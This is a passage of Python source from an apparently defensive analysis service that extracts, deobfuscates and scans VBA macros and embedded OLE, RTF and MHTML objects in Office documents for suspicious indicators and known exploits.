            file_contents: Original sample file content.
            request_hash: Original submitted sample's sha256hash.
        """
        # noinspection PyBroadException
        try:
            # olevba currently doesn't support vba_stomping detection on in memory files
            # Todo: pass the file contents in when olevba supports it
            vba_parser = VBA_Parser(filename)
            try:
                if vba_parser.detect_vba_macros():
                    # noinspection PyBroadException
                    try:
                        for (subfilename, stream_path, vba_filename, vba_code) in vba_parser.extract_macros():
                            if vba_code.strip() == '':
                                continue
                            vba_code_sha256 = hashlib.sha256(str(vba_code).encode()).hexdigest()
                            if vba_code_sha256 == request_hash:
                                continue

                            self.macros.append(vba_code)
                    except Exception:
                        self.log.debug(f"OleVBA VBA_Parser.extract_macros failed for sample {self.sha}: "
                                       f"{traceback.format_exc()}")
                        section = ResultSection("OleVBA : Error extracting macros")
                        section.add_tag('technique.macro', "Contains VBA Macro(s)")
                        self.ole_result.add_section(section)

            except Exception as e:
                self.log.debug(f"OleVBA VBA_Parser.detect_vba_macros failed for sample {self.sha}: {str(e)}")
                section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
                self.ole_result.add_section(section)

            # Analyze PCode
            try:
                if vba_parser:
                    if vba_parser.detect_vba_stomping():
                        self.vba_stomping = True
                    pcode_res = process_doc(vba_parser)
                    if pcode_res:
                        self.pcode.append(pcode_res)
            except Exception as e:
                self.log.debug(f"pcodedmp.py failed to analyze pcode for sample {self.sha}. Reason: {str(e)}")

        except Exception:
            self.log.debug(f"OleVBA VBA_Parser constructor failed for sample {self.sha}, "
                           f"may not be a supported OLE document")

    def macro_section_builder(self, vba_code: str, analyzed_code: str) -> ResultSection:
        """Build an AL result section for Macro (VBA code) content.

        Args:
            macros: list of VBA codes for building result sections.

        Returns: section with macro results
        """
        vba_code_sha256 = hashlib.sha256(vba_code.encode()).hexdigest()
        macro_section = ResultSection(f"Macro SHA256 : {vba_code_sha256}")
        macro_section.add_tag('file.ole.macro.sha256', vba_code_sha256)
        if self.flag_macro(analyzed_code):
            macro_section.add_line("Macro may be packed or obfuscated.")
            macro_section.set_heuristic(20)

        dump_subsection = ResultSection("Macro contents dump", body_format=BODY_FORMAT.MEMORY_DUMP)
        if analyzed_code != vba_code:
            dump_subsection.title_text += " [deobfuscated]"
            dump_subsection.add_tag('technique.obfuscation', "VBA Macro String Functions")

        if len(analyzed_code) > self.MAX_STRINGDUMP_CHARS:
            dump_subsection.title_text += f" - Displaying only the first {self.MAX_STRINGDUMP_CHARS} characters."
            dump_subsection.add_line(analyzed_code[0:self.MAX_STRINGDUMP_CHARS])
        else:
            dump_subsection.add_line(analyzed_code)

        # Check for Excel 4.0 macro sheet
        if re.search(r'Sheet Information - Excel 4\.0 macro sheet', analyzed_code):
            dump_subsection.set_heuristic(51)

        return dump_subsection

    # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages
    def deobfuscator(self, text: str) -> str:
        """Attempts to identify and decode multiple types of deobfuscation in VBA code.

        Args:
            text: Original VBA code.

        Returns:
           Original text, or deobfuscated text if specified techniques are detected.
        """
        deobf = text
        # noinspection PyBroadException
        try:
            # leading & trailing quotes in each local function are to facilitate the final re.sub in deobfuscator()

            # repeated chr(x + y) calls seen in wild, as per SANS ISC diary from May 8, 2015
            def deobf_chrs_add(m):
                if m.group(0):
                    i = int(m.group(1)) + int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}\"'
                return ''

            deobf = re.sub(r'chr[$]?\((\d+) \+ (\d+)\)', deobf_chrs_add, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_add(m):
                result = ''
                if m.group(0):
                    result = m.group(0)

                    i = int(m.group(1)) + int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        result = f'"{chr(i)}"'
                return result

            deobf = re.sub(r'chrw[$]?\((\d+) \+ (\d+)\)', deobf_unichrs_add, deobf, flags=re.IGNORECASE)

            # suspect we may see chr(x - y) samples as well
            def deobf_chrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(r'chr[$]?\((\d+) - (\d+)\)', deobf_chrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(r'chrw[$]?\((\d+) - (\d+)\)', deobf_unichrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_chr(m):
                if m.group(1):
                    i = int(m.group(1))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(r'chr[$]?\((\d+)\)', deobf_chr, deobf, flags=re.IGNORECASE)

            def deobf_unichr(m):
                if m.group(1):
                    i = int(m.group(1))

                    # chr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(r'chrw[$]?\((\d+)\)', deobf_unichr, deobf, flags=re.IGNORECASE)

            # handle simple string concatenations
            deobf = re.sub('" & "', '', deobf)

        except Exception:
            self.log.debug(f"Deobfuscator regex failure for sample {self.sha}, reverting to original text")
            deobf = text

        return deobf

    def macro_scanner(self, text: str, autoexecution: Set[str], suspicious: Set[str],
                      network: Set[str], network_section: ResultSection) -> bool:
        """ Scan the text of a macro with VBA_Scanner and collect results

        Args:
            text: Original VBA code.
            autoexecution: set for adding autoexecution strings
            suspicious: set for adding suspicious strings
            network: set for adding host/network strings
            network_section: section for tagging network results
        Returns:
            Whether interesting results were found
        """
        try:
            vba_scanner = VBA_Scanner(text)
            vba_scanner.scan(include_decoded_strings=True)

            for string in self.ADDITIONAL_SUSPICIOUS_KEYWORDS:
                if re.search(string, text, re.IGNORECASE):
                    # play nice with detect_suspicious from olevba.py
                    suspicious.add(string.lower())

            for keyword, description in vba_scanner.autoexec_keywords:
                autoexecution.add(keyword.lower())

            for keyword, description in vba_scanner.suspicious_keywords:
                suspicious.add(keyword.lower())

            freq = network_section.heuristic.frequency
            for keyword, description in vba_scanner.iocs:
                # olevba seems to have swapped the keyword for description during iocs extraction
                # this holds true until at least version 0.27
                if isinstance(description, str):
                    description = description.encode('utf-8', errors='ignore')

                desc_ip = re.match(self.IP_RE, description)
                puri, duri, tags = self.parse_uri(description)
                if puri:
                    network.add(f"{keyword}: {safe_str(duri)}")
                    network_section.heuristic.increment_frequency()
                elif desc_ip:
                    ip_str = safe_str(desc_ip.group(1))
                    if not is_ip_reserved(ip_str):
                        network_section.heuristic.increment_frequency()
                        network_section.add_tag('network.static.ip', ip_str)
                else:
                    network.add(f"{keyword}: {safe_str(description)}")
                for tag in tags:
                    network_section.add_tag(tag[0], tag[1])

            return (vba_scanner.autoexec_keywords
                    or vba_scanner.suspicious_keywords
                    or freq < network_section.heuristic.frequency)

        except Exception:
            self.log.warning(f"OleVBA VBA_Scanner constructor failed for sample {self.sha}: {traceback.format_exc()}")
            return False

    def rip_mhtml(self, data: bytes) -> None:
        """Parses and extracts ActiveMime Document(document/office/mhtml).

        Args:
            data: MHTML data.
        """
        if self.task.file_type != 'document/office/mhtml':
            return
        mime_res = ResultSection("ActiveMime Document(s) in multipart/related", heuristic=Heuristic(26))
        mhtml = email.message_from_bytes(data)
        # find all the attached files:
        for part in mhtml.walk():
            content_type = part.get_content_type()
            if content_type == "application/x-mso":
                part_data = part.get_payload(decode=True)
                if len(part_data) > 0x32 and part_data[:10].lower() == "activemime":
                    try:
                        part_data = zlib.decompress(part_data[0x32:])  # Grab  the zlib-compressed data
                        part_filename = part.get_filename(None) or hashlib.sha256(part_data).hexdigest()
                        self.extract_file(part_data, part_filename, "ActiveMime x-mso from multipart/related.")
                        mime_res.add_line(part_filename)
                    except Exception as e:
                        self.log.debug(f"Could not decompress ActiveMime part for sample {self.sha}: {str(e)}")

        if mime_res.body:
            self.ole_result.add_section(mime_res)

    def process_ole10native(self, stream_name: str, data: bytes, streams_section: ResultSection) -> bool:
        """Parses ole10native data and reports on suspicious content.

        Args:
            stream_name: Name of OLE stream.
            data: Ole10native data.
            streams_section: Streams AL result section.

        Returns: if suspicious content is found
        """
        suspicious = False
        sus_sec = ResultSection("Suspicious streams content:")
        try:
            ole10native = Ole10Native(data)

            self.extract_file(ole10native.native_data,
                              hashlib.sha256(ole10native.native_data).hexdigest(),
                              f"Embedded OLE Stream {stream_name}")
            stream_desc = f"{stream_name} ({ole10native.label}):\n\tFilename: {ole10native.filename}\n\t" \
                          f"Data Length: {ole10native.native_data_size}"
            streams_section.add_line(stream_desc)

            # handle embedded native macros
            if ole10native.label.endswith(".vbs") or \
                    ole10native.command.endswith(".vbs") or \
                    ole10native.filename.endswith(".vbs"):

                self.macros.append(ole10native.native_data.decode(errors='ignore'))
            else:
                # Look for suspicious strings
                for pattern, desc in self.SUSPICIOUS_STRINGS:
                    matched = re.search(pattern, ole10native.native_data)
                    if matched:
                        suspicious = True
                        if b'javascript' in desc:
                            sus_sec.add_subsection(ResultSection("Suspicious string found: 'javascript'",
                                                                 heuristic=Heuristic(23)))
                        if b'executable' in desc:
                            sus_sec.add_subsection(ResultSection("Suspicious string found: 'executable'",
                                                                 heuristic=Heuristic(24)))
                        else:
                            sus_sec.add_subsection(ResultSection("Suspicious string found",
                                                                 heuristic=Heuristic(25)))
                        sus_sec.add_line(f"'{safe_str(matched.group(0))}' string found in stream "
                                         f"{ole10native.filename}, indicating {safe_str(desc)}")

            if suspicious:
                streams_section.add_subsection(sus_sec)

            return True
        except Exception as e:
            self.log.debug(f"Failed to parse Ole10Native stream for sample {self.sha}: {str(e)}")
            return False

    def process_powerpoint_stream(self, data: bytes, streams_section: ResultSection) -> bool:
        """Parses powerpoint stream data and reports on suspicious characteristics.

        Args:
            data: Powerpoint stream data.
            streams_section: Streams AL result section.

        Returns: if successful
        """
        try:
            powerpoint = PowerPointDoc(data)
            pp_line = "PowerPoint Document"
            if len(powerpoint.objects) > 0:
                streams_section.add_line(pp_line)
            for obj in powerpoint.objects:
                if obj.rec_type == "ExOleObjStg":
                    if obj.error is not None:
                        streams_section.add_line("\tError parsing ExOleObjStg stream. This is suspicious.")
                        #streams_section.score += 50
                        continue

                    ole_hash = hashlib.sha256(obj.raw).hexdigest()
                    self.extract_file(obj.raw,
                                      f"{ole_hash}.pp_ole",
                                      "Embedded Ole Storage within PowerPoint Document Stream")
                    streams_section.add_line(f"\tPowerPoint Embedded OLE Storage:\n\t\tSHA-256: {ole_hash}\n\t\t"
                                             f"Length: {len(obj.raw)}\n\t\tCompressed: {obj.compressed}")
                    self.log.debug(f"Added OLE stream within a PowerPoint Document Stream: {ole_hash}.pp_ole")
            return True
        except Exception as e:
            self.log.warning(f"Failed to parse PowerPoint Document stream for sample {self.sha}: {str(e)}")
            return False

    def process_ole_stream(self, ole: olefile.OleFileIO, streams_section: ResultSection) -> None:
        """Parses OLE data and reports on metadata and suspicious properties.

        Args:
            ole: OLE stream data.
            streams_section: Streams AL result section.

        Returns:
            None.
        """
        ole_tags = {
            'title': 'file.ole.summary.title',
            'subject': 'file.ole.summary.subject',
            'author': 'file.ole.summary.author',
            'comments': 'file.ole.summary.comment',
            'last_saved_by': 'file.ole.summary.last_saved_by',
            'last_printed': 'file.ole.summary.last_printed',
            'create_time': 'file.ole.summary.create_time',
            'last_saved_time': 'file.ole.summary.last_saved_time',
            'manager': 'file.ole.summary.manager',
            'company': 'file.ole.summary.company',
            'codepage': 'file.ole.summary.codepage',
        }

        # OLE Meta
        meta = ole.get_metadata()
        meta_sec = ResultSection("OLE Metadata:")
        # Summary Information
        summeta_sec_json_body = dict()
        summeta_sec = ResultSection("Properties from the Summary Information Stream:")
        for prop in meta.SUMMARY_ATTRIBS:
            value = getattr(meta, prop)
            if value is not None and value not in ['"', "'", ""]:
                if prop == "thumbnail":
                    meta_name = f'{hashlib.sha256(value).hexdigest()[0:15]}.{prop}.data'
                    self.extract_file(value, meta_name, "OLE metadata thumbnail extracted")
                    summeta_sec_json_body[prop] = "[see extracted files]"
                    summeta_sec.set_heuristic(18)
                    continue
                # Extract data over n bytes
                if isinstance(value, str) and len(value) > self.metadata_size_to_extract:
                    data = value.encode()
                    meta_name = f'{hashlib.sha256(data).hexdigest()[0:15]}.{prop}.data'
                    self.extract_file(data, meta_name, f"OLE metadata from {prop.upper()} attribute")
                    summeta_sec_json_body[prop] = f"[Over {self.metadata_size_to_extract} bytes, "\
                                                  f"see extracted files]"
                    summeta_sec.set_heuristic(17)
                    continue
                summeta_sec_json_body[prop] = safe_str(value, force_str=True)
                # Add Tags
                if prop in ole_tags and value:
                    summeta_sec.add_tag(ole_tags[prop], safe_str(value))
        if summeta_sec_json_body:
            summeta_sec.body = json.dumps(summeta_sec_json_body)

        # Document Summary
        docmeta_sec_json_body = dict()
        docmeta_sec = ResultSection("Properties from the Document Summary Information Stream:")
        for prop in meta.DOCSUM_ATTRIBS:
            value = getattr(meta, prop)
            if value is not None and value not in ['"', "'", ""]:
                if isinstance(value, str):
                    # Extract data over n bytes
                    if len(value) > self.metadata_size_to_extract:
                        data = value.encode()
                        meta_name = f'{hashlib.sha256(data).hexdigest()[0:15]}.{prop}.data'
                        self.extract_file(data, meta_name, f"OLE metadata from {prop.upper()} attribute")
                        docmeta_sec_json_body[prop] = f"[Over {self.metadata_size_to_extract} bytes, "\
                                                      f"see extracted files]"
                        docmeta_sec.set_heuristic(17)
                        continue
                docmeta_sec_json_body[prop] = safe_str(value)
                # Add Tags
                if prop in ole_tags and value:
                    docmeta_sec.add_tag(ole_tags[prop], safe_str(value))
        if docmeta_sec_json_body:
            docmeta_sec.body = json.dumps(docmeta_sec_json_body)

        if summeta_sec.body or docmeta_sec.body:
            if summeta_sec.body:
                meta_sec.add_subsection(summeta_sec)
            if docmeta_sec.body:
                meta_sec.add_subsection(docmeta_sec)
            streams_section.add_subsection(meta_sec)

        # CLSIDS: Report, tag and flag known malicious
        clsid_sec_json_body = dict()
        clsid_sec = ResultSection("CLSIDs:")
        ole_clsid = ole.root.clsid
        if ole_clsid is not None and ole_clsid not in ['"', "'", ""] and ole_clsid not in self.extracted_clsids:
            self.extracted_clsids.add(ole_clsid)
            clsid_sec.add_tag('file.ole.clsid', f"{safe_str(ole_clsid)}")
            clsid_desc = clsid.KNOWN_CLSIDS.get(ole_clsid, 'unknown CLSID')
            mal_msg = ""
            if 'CVE' in clsid_desc:
                cves = re.findall(r'CVE-[0-9]{4}-[0-9]*', clsid_desc)
                for cve in cves:
                    clsid_sec.add_tag('attribution.exploit', cve)
                clsid_sec.set_heuristic(52)
                mal_msg = " FLAGGED MALICIOUS"
            clsid_sec_json_body[ole_clsid] = f"{clsid_desc} {mal_msg}"
        if clsid_sec_json_body:
            clsid_sec.body = json.dumps(clsid_sec_json_body)

        if clsid_sec.body:
            streams_section.add_subsection(clsid_sec)

        listdir = ole.listdir()

        decompress = False
        for dir_entry in listdir:
            if "\x05HwpSummaryInformation" in dir_entry:
                decompress = True
        decompress_macros: List[bytes] = []

        stream_num = 0
        exstr_sec = None
        if self.request.deep_scan:
            exstr_sec = ResultSection("Extracted Ole streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        ole10_res = False
        ole10_sec = ResultSection("Extracted Ole10Native streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        pwrpnt_res = False
        pwrpnt_sec = ResultSection("Extracted Powerpoint streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        swf_res = False
        swf_sec = ResultSection("Flash objects detected in OLE stream:", body_format=BODY_FORMAT.MEMORY_DUMP,
                                heuristic=Heuristic(5))
        hex_res = False
        hex_sec = ResultSection("VB hex notation:", heuristic=Heuristic(6))
        sus_res = False
        sus_sec = ResultSection("Suspicious stream content:")

        ole_dir_examined = set()
        for direntry in ole.direntries:
            extract_stream = False
            if direntry is not None and direntry.entry_type == olefile.STGTY_STREAM:
                stream = safe_str(direntry.name)
                self.log.debug(f"Extracting stream {stream} for sample {self.sha}")

                # noinspection PyProtectedMember
                fio = ole._open(direntry.isectStart, direntry.size)

                data = fio.getvalue()
                stm_sha = hashlib.sha256(data).hexdigest()
                # Only process unique content
                if stm_sha in ole_dir_examined:
                    continue
                ole_dir_examined.add(stm_sha)

                # noinspection PyBroadException
                try:

                    if "Ole10Native" in stream:
                        if self.process_ole10native(stream, data, ole10_sec) is True:
                            ole10_res = True
                            continue

                    elif "PowerPoint Document" in stream:
                        if self.process_powerpoint_stream(data, pwrpnt_sec) is True:
                            pwrpnt_res = True
                            continue

                    if decompress:
                        try:
                            data = zlib.decompress(data, -15)
                        except zlib.error:
                            pass

                    # Find flash objects in streams
                    if b'FWS' in data or b'CWS' in data:
                        swf_found = self.extract_swf_objects(fio)
                        if swf_found:
                            extract_stream = True
                            swf_res = True
                            swf_sec.add_line(f"Flash object detected in OLE stream {stream}")
                            swf_sec.set_heuristic(5)

                    # Find hex encoded chunks
                    for vbshex in re.findall(self.VBS_HEX_RE, data):
                        decoded = self.extract_vb_hex(vbshex)
                        if decoded:
                            extract_stream = True
                            hex_res = True
                            hex_sec.add_line(f"Found large chunk of VBA hex notation in stream {stream}")
                            hex_sec.set_heuristic(6)

                    # Find suspicious strings
                    # Look for suspicious strings
                    for pattern, desc in self.SUSPICIOUS_STRINGS:
                        matched = re.search(pattern, data, re.M)
                        if matched:
                            if "_VBA_PROJECT" not in stream:
                                extract_stream = True
                                sus_res = True
                                body = f"'{safe_str(matched.group(0))}' string found in stream " \
                                       f"{stream}, indicating {safe_str(desc)}"
                                if b'javascript' in desc:
                                    sus_sec.add_subsection(ResultSection("Suspicious string found: 'javascript'",
                                                                         body=body,
                                                                         heuristic=Heuristic(23)))
                                elif b'executable' in desc:
                                    sus_sec.add_subsection(ResultSection("Suspicious string found: 'executable'",
                                                                         body=body,
                                                                         heuristic=Heuristic(24)))
                                else:
                                    sus_sec.add_subsection(ResultSection("Suspicious string found",
                                                                         body=body,
                                                                         heuristic=Heuristic(25)))

                    # Finally look for other IOC patterns, will ignore SRP streams for now
                    if not re.match(r'__SRP_[0-9]*', stream):
                        ole_ioc_res = ResultSection(f"IOCs in {stream}:", heuristic=Heuristic(9, frequency=0))
                        iocs, extract_stream = self.check_for_patterns(data)
                        for tag_type, tags in iocs.items():
                            ole_ioc_res.add_line(
                                f"Found the following {tag_type.rsplit('.', 1)[-1].upper()} string(s):")
                            ole_ioc_res.add_line(b'  |  '.join(tags).decode())
                            ole_ioc_res.heuristic.increment_frequency(len(tags))
                            for tag in tags:
                                ole_ioc_res.add_tag(tag_type, tag)
                        if iocs:
                            sus_res = True
                            sus_sec.add_subsection(ole_ioc_res)
                    ole_b64_res, _ = self.check_for_b64(data, stream)
                    if ole_b64_res:
                        ole_b64_res.set_heuristic(10)
                        extract_stream = True
                        sus_res = True
                        sus_sec.add_subsection(ole_b64_res)

                    # All streams are extracted with deep scan (see below)
                    if extract_stream and not self.request.deep_scan:
                        stream_num += 1
                        self.extract_file(data, f'{stm_sha}.ole_stream', "Embedded OLE Stream {stream}")
                        if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/")):
                            decompress_macros.append(data)

                    # Only write all streams with deep scan.
                    if self.request.deep_scan:
                        stream_num += 1
                        exstr_sec.add_line(f"Stream Name:{stream}, SHA256: {stm_sha}")
                        self.extract_file(data, f'{stm_sha}.ole_stream', "Embedded OLE Stream {stream}")
                        if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/")):
                            decompress_macros.append(data)

                except Exception:
                    self.log.warning(f"Error adding extracted stream {stream} for sample "
                                     f"{self.sha}:\t{traceback.format_exc()}")
                    continue

        if exstr_sec and stream_num > 0:
            streams_section.add_subsection(exstr_sec)
        if ole10_res:
            streams_section.add_subsection(ole10_sec)
        if pwrpnt_res:
            streams_section.add_subsection(pwrpnt_sec)
        if swf_res:
            streams_section.add_subsection(swf_sec)
        if hex_res:
            streams_section.add_subsection(hex_sec)
        if sus_res:
            streams_section.add_subsection(sus_sec)

        if decompress_macros:
            # HWP Files
            ResultSection("Compressed macros found, see extracted files", heuristic=Heuristic(22),
                          parent=streams_section)
            macros = b'\n'.join(decompress_macros)
            stream_name = f'{hashlib.sha256(macros).hexdigest()}.macros'
            self.extract_file(macros, stream_name, "Combined macros")

    # noinspection PyBroadException
    def extract_streams(self, file_name: str, file_contents: bytes) -> None:
        """Extracts OLE streams and reports on metadata and suspicious properties.

        Args:
            file_name: Path to original sample.
            file_contents: Original sample file content.
        """
        oles = {}
        try:
            streams_res = ResultSection("Embedded document stream(s)")
            sep = "-----------------------------------------"
            is_zip = False
            is_ole = False
            # Get the OLEs from PK package
            if zipfile.is_zipfile(file_name):
                is_zip = True
                z = zipfile.ZipFile(file_name)
                for f in z.namelist():
                    if f in oles:
                        continue
                    bin_data = z.open(f).read()
                    bin_fname = os.path.join(self.working_directory, f"{hashlib.sha256(bin_data).hexdigest()}.tmp")
                    with open(bin_fname, 'wb') as bin_fh:
                        bin_fh.write(bin_data)
                    if olefile.isOleFile(bin_fname):
                        oles[f] = olefile.OleFileIO(bin_fname)
                z.close()

            if olefile.isOleFile(file_name):
                is_ole = True
                oles[file_name] = olefile.OleFileIO(file_name)

            if is_zip and is_ole:
                streams_res.set_heuristic(2)

            for ole_filename in oles.keys():
                try:
                    self.process_ole_stream(oles[ole_filename], streams_res)

                except Exception:
                    self.log.warning(f"Error extracting streams for sample {self.sha}: {traceback.format_exc(limit=2)}")

            # RTF Package
            rtfp = rtfparse.RtfObjParser(file_contents)
            rtfp.parse()
            embedded = []
            linked = []
            unknown = []
            # RTF objdata
            for rtfobj in rtfp.objects:
                res_txt = ""
                res_alert = ""
                if rtfobj.is_ole:
                    res_txt += f'format_id: {rtfobj.format_id}\n'
                    res_txt += f'class name: {rtfobj.class_name}\n'
                    # if the object is linked and not embedded, data_size=None:
                    if rtfobj.oledata_size is None:
                        res_txt += 'data size: N/A\n'
                    else:
                        res_txt += f'data size: {rtfobj.oledata_size}\n'
                    if rtfobj.is_package:
                        res_txt = f'Filename: {rtfobj.filename}\n'
                        res_txt += f'Source path: {rtfobj.src_path}\n'
                        res_txt += f'Temp path = {rtfobj.temp_path}\n'

                        # check if the file extension is executable:
                        _, ext = os.path.splitext(rtfobj.filename)

                        if re.match(self.EXECUTABLE_EXTENSIONS_RE, ext):
                            res_alert += 'CODE/EXECUTABLE FILE'
                        else:
                            # check if the file content is executable:
                            m = magic.Magic()
                            ftype = m.from_buffer(rtfobj.olepkgdata)
                            if "executable" in ftype:
                                res_alert += 'CODE/EXECUTABLE FILE'
                    else:
                        res_txt += 'Not an OLE Package'
                    # Detect OLE2Link exploit
                    # http://www.kb.cert.org/vuls/id/921560
                    if rtfobj.class_name == 'OLE2Link':
                        res_alert += 'Possibly an exploit for the OLE2Link vulnerability (VU#921560, CVE-2017-0199)'
                else:
                    res_txt = f'{hex(rtfobj.start)} is not a well-formed OLE object'
                    if len(rtfobj.rawdata) > 4999:
                        res_alert += "Data of malformed OLE object over 5000 bytes"
                    streams_res.set_heuristic(19)

                if rtfobj.format_id == oleobj.OleObject.TYPE_EMBEDDED:
                    embedded.append((res_txt, res_alert))
                elif rtfobj.format_id == oleobj.OleObject.TYPE_LINKED:
                    linked.append((res_txt, res_alert))
                else:
                    unknown.append((res_txt, res_alert))

                # Write object content to extracted file
                i = rtfp.objects.index(rtfobj)
                if rtfobj.is_package:
                    if rtfobj.filename:
                        fname = self.sanitize_filename(rtfobj.filename)
                    else:
                        fname = f'object_{rtfobj.start}.noname'
                    self.extract_file(rtfobj.olepkgdata, fname, f'OLE Package in object #{i}:')

                # When format_id=TYPE_LINKED, oledata_size=None
                elif rtfobj.is_ole and rtfobj.oledata_size is not None:
                    # set a file extension according to the class name:
                    class_name = rtfobj.class_name.lower()
                    if class_name.startswith(b'word'):
                        ext = 'doc'
                    elif class_name.startswith(b'package'):
                        ext = 'package'
                    else:
                        ext = 'bin'
                    fname = f'object_{hex(rtfobj.start)}.{ext}'
                    self.extract_file(rtfobj.oledata, fname, f'Embedded in OLE object #{i}:')

                else:
                    fname = f'object_{hex(rtfobj.start)}.raw'
                    self.extract_file(rtfobj.rawdata, fname, f'Raw data in object #{i}:')

            if len(embedded) > 0:
                emb_sec = ResultSection("RTF Embedded Object Details", body_format=BODY_FORMAT.MEMORY_DUMP,
                                        heuristic=Heuristic(21))
                for txt, alert in embedded:
                    emb_sec.add_line(sep)
                    emb_sec.add_line(txt)
                    if alert != "":
                        emb_sec.set_heuristic(11)
                        if "CVE" in alert.lower():
                            cves = re.findall(r'CVE-[0-9]{4}-[0-9]*', alert)
                            for cve in cves:
                                emb_sec.add_tag('attribution.exploit', cve)
                        emb_sec.add_line(f"Malicious Properties found: {alert}")
                streams_res.add_subsection(emb_sec)
            if len(linked) > 0:
                lik_sec = ResultSection("Linked Object Details", body_format=BODY_FORMAT.MEMORY_DUMP,
                                        heuristic=Heuristic(13))
                for txt, alert in linked:
                    lik_sec.add_line(txt)
                    if alert != "":
                        if "CVE" in alert.lower():
                            cves = re.findall(r'CVE-[0-9]{4}-[0-9]*', alert)
                            for cve in cves:
                                lik_sec.add_tag('attribution.exploit', cve)
                        lik_sec.set_heuristic(12)
                        lik_sec.add_line(f"Malicious Properties found: {alert}")
                streams_res.add_subsection(lik_sec)
            if len(unknown) > 0:
                unk_sec = ResultSection("Unknown Object Details", body_format=BODY_FORMAT.MEMORY_DUMP)
                for txt, alert in unknown:
                    unk_sec.add_line(txt)
                    if alert != "":
                        if "CVE" in alert.lower():
                            cves = re.findall(r'CVE-[0-9]{4}-[0-9]*', alert)
                            for cve in cves:
                                unk_sec.add_tag('attribution.exploit', cve)
                        unk_sec.set_heuristic(14)
                        unk_sec.add_line(f"Malicious Properties found: {alert}")
                streams_res.add_subsection(unk_sec)

            if streams_res.body or len(streams_res.subsections) > 0:
                self.ole_result.add_section(streams_res)

        except Exception:
            self.log.debug(f"Error extracting streams for sample {self.sha}: {traceback.format_exc(limit=2)}")

        finally:
            for fd in oles.values():
                try:
                    fd.close()
                except Exception:
                    pass
